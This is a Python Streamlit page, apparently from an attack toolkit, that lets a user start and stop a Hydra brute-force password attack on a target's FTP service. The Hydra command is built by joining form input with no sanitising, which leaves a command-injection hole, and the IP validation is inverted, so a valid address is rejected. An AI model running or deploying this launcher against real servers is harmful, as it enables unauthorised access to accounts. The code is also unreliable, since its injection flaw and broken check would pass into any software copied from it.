import streamlit as st
from threadManagement.ThreadManager import ThreadManager
from utils.InternetProtocolValidator import InternetProtocolValidator

attack = "Bruteforce FTP"
dictionary = ""
login = ""
threadManager = ThreadManager()
st.title(attack)

# check if attack is already in action
attackInAction = threadManager.check_running(attack=attack)
# if yes, allow attack to be stopped
if attackInAction == True:
    if not threadManager.check_for_error(attack=attack):
        if st.button("Stop attack"):
            threadManager.stop_attack(attack=attack)
            st.rerun()
else:
    # if no, allow execution
    dictionary = st.text_input(label="Dictionary")
    login = st.text_input(label="Login as")
    target = st.text_input(label="Target IP address")
    if st.button("Start attack"):
        print(dictionary == "")
        print(login == "")
        print(InternetProtocolValidator.is_valid_ip(ip_string=target))
        if dictionary == "" or login == "" or InternetProtocolValidator.is_valid_ip(ip_string=target):
            st.error(body="Every field must be filled")
        else:
            command = "hydra -l " + login + " -P " + dictionary + " " + target + " -t 4 -I -V ftp -f"
            threadManager.start_attack(attack=attack, command=command)
            st.rerun()
